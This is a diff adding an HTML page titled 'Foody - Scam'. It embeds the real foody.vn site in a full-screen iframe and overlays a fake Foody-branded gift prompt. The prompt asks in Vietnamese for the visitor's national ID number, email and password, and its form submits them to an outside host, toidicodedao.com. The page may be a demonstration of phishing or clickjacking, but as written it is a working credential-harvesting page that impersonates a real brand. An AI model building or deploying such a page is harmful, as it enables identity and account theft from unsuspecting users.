@@ -1,0 +1,86 @@
+<html>
+  <head>
+    <title>Foody - Scam</title>
+    <style>
+      body {
+        position: relative;
+        margin: 0;
+      }
+
+      iframe, #fake {
+        border: none;
+        position: absolute;
+        width: 100%;
+        height: 100%;
+      }
+      
+      #fake {
+        z-index: 9999;
+        background: rgba(0, 0, 0, 0.3);
+      }
+      
+      #scam-form {
+        position: absolute;
+        width: 500px;
+        top: 30vh;
+        left: 30vw;
+        background-color: white;
+        font-family: arial;
+        padding: 1rem;
+        border-radius: 10px;
+      }
+      
+      #scam-form form {
+        margin-bottom: 0;
+      }
+      
+      #scam-form input, #scam-form button {
+        display: block;
+        heigth: 15px;
+        padding: 6px;
+        width: 100%;
+        margin-bottom: 8px;
+      }
+      
+      #scam-form button {
+        border-radius: 6px;
+        background: #c00!important;
+        border: 0;
+        cursor: pointer;
+        color: white;
+        font-weight: bold;
+        font-size: 15px;
+        padding: 10px;
+        margin-top: 12px;
+        margin-bottom: 0;
+      }
+      
+    </style>
+  </head>
+  <body>
+    <iframe id="fr" src="https://www.foody.vn"></iframe>
+
+    <div id="fake">
+      <div id="scam-form">
+        <img src="https://www.foody.vn/style/images/logo/foody-vn.png" />
+        <h3>
+          Hế nhô, để nhận được quà của Foody, bạn hãy xác nhận lại CMND, email và mật khẩu nhé :3
+        </h3>
+        <form action="https://toidicodedao.com" method="GET">
+          <input name="cmnd" placeholder="Số CMND" />
+          <input name="email" placeholder="Email" />
+          <input name="password" placeholder="Mật khẩu" />
+        
+          <button>
+            Nhận quà
+          </button>
+        </form>
+      </div> 
+    </div>
+      
+  </body>
+  
+  <script>
+
+  </script>
+</html>
